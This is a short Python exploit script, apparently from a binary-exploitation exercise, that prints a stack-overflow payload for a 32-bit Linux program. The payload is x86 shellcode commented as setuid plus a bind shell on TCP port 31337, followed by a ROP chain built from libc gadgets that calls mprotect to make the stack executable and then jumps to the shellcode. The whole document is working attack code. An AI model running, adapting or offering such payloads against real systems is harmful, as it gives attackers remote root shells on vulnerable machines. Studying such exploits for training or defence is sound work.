from struct import pack
p32 = lambda x : pack("I",x)                    # function to convert to little endian
i = 0x40                                        # for stack shifts outside gdb
libc = 0xf7de6000                               # libc base address
shellcode = "\x90"*4                            # small NOP sled
shellcode+= "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7"
shellcode+= "\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b"
shellcode+= "\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66"
shellcode+= "\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0"
shellcode+= "\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50"
shellcode+= "\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89"
shellcode+= "\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68"
shellcode+= "n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b"
shellcode+= "\xcd\x80"                          # 96bytes setuid+bind_tcp port 31337
ecx = p32(0xffffd21c+i)                         # ecx for esp=[ecx-0x4] and i for stack shift
pad = 'B'*4                                     # just 4 bytes padding
mprotect = p32(0xf7ed6760+13)                   # address of mprotect+13 because we already got arguments into registers
stack = p32(0xfffdd001)                         # address of starting of stack
ret = p32(0xffffd1ac+i)                         # the address of shellcode to return to and i for stack shift
size = p32(0x01010101)                          # size argument mprotect
perm = p32(0xffffffff)                          # for incrementing it to 0x7 rwx permission
pop_edx_ecx_ebx_off = 0x00101b41                # pop edx ; pop ecx ; pop ebx ; ret offset
pop_edx_ecx_ebx = p32(libc+pop_edx_ecx_ebx_off) # add offset to libc
dec_ebx_off = 0x0018a40e                        # dec ebx ; ret offset
dec_ebx = p32(libc+dec_ebx_off)                 # add offset to libc
inc_edx_off = 0x0002b8e1                        # inc edx ; ret offset
inc_edx = p32(libc+inc_edx_off)                 # add offset to libc

payload = shellcode + ecx + pad
payload+= pop_edx_ecx_ebx + perm + size + stack
payload+= dec_ebx + inc_edx*8                   # inc edx 8 times to get to 0x7
payload+= mprotect + pad + ret                  # padding just because of leftover by mprotect and then ret to shellcode

print(payload)